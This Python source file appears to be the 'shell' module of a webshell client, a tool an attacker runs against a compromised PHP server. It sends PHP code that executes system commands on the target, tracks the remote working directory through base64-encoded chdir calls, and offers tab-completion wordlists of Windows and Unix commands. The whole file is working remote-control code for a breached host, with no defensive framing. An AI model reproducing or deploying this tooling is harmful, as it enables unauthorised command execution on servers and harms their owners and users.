from libs.config import gget, alias, color, set_namespace
from libs.myapp import send, base64_encode, is_windows, get_system_code
from libs.app import readline, value_translation

NEW_WINDOWS_WORDLIST = {"common_wordlist": (
    "echo",
    "dir",
    "cd",
    "md",
    "rd",
    "tree",
    "type",
    "ren",
    "copy",
    "move",
    "del",
    "replace",
    "attrib",
    "cls",
    "ver",
    "ver",
    "time",
    "systeminfo",
    "start",
    "exit",
    "wmic",
    "net",
    "start",
    "stop",
    "share",
    "use",
    "view",
    "tasklist",
    "ipconfig",
    "netstat",
    "arp",
)}

NEW_UNIX_WORDLIST = {"common_wordlist": (
    "echo",
    "ls",
    "ls -al",
    "rm",
    "cp",
    "mv",
    "cat",
    "chmod",
    "chown",
    "mkdir",
    "uname",
    "whereis",
    "which",
    "date",
    "curl",
    "wget",
    "dir",
    "cd",
    "pwd",
    "mkdir",
    "ps",
    "ps aux",
    "free",
    "df",
    "kill",
    "find",
    "gzip",
    "tar",
    "grep",
)}


@alias(True, func_alias="s", _type="SHELL")
def run(*commands):
    """
    shell

    Get a temporary shell of target system by system function or just run a shell command.
    """
    command = str(value_translation(gget("raw_command_args")))
    if (command):
        res = send(get_system_code(command))
        if (not res):
            return
        print(color.green("\nResult:\n\n") + res.r_text.strip() + "\n")
        return
    print(color.cyan("Eenter interactive temporary shell...\n\nUse 'back' command to return doughnuts.\n"))
    res = send(f'{get_system_code("whoami")}print("@".$_SERVER["SERVER_NAME"]."|".getcwd());').r_text.strip()
    prompt, pwd = res.split("|")
    set_namespace("webshell", False, True)
    wordlist = gget("webshell.wordlist")
    readline.set_wordlist(NEW_WINDOWS_WORDLIST if (is_windows()) else NEW_UNIX_WORDLIST)
    if is_windows():
        prompt = "%s> "
    else:
        prompt = prompt.replace("\r", "").replace("\n", "") + ":%s$ "
    try:
        while gget("loop"):
            print(prompt % pwd, end="")
            command = str(value_translation(readline()))
            lower_command = command.lower()
            if (lower_command.lower() in ['exit', 'quit', 'back']):
                print()
                break
            if (command == ''):
                print()
                continue
            b64_pwd = base64_encode(pwd)
            if (lower_command.startswith("cd ") and len(lower_command) > 3):
                path = base64_encode(lower_command[3:].strip())
                res = send(f'chdir(base64_decode(\'{b64_pwd}\'));chdir(base64_decode(\'{path}\'));print(getcwd());')
                if (not res):
                    return
                pwd = res.r_text.strip()
            else:
                res = send(f'chdir(base64_decode(\'{b64_pwd}\'));' + get_system_code(command))
                if (not res):
                    return
                print("\n" + res.r_text.strip() + "\n")
    finally:
        readline.set_wordlist(wordlist)
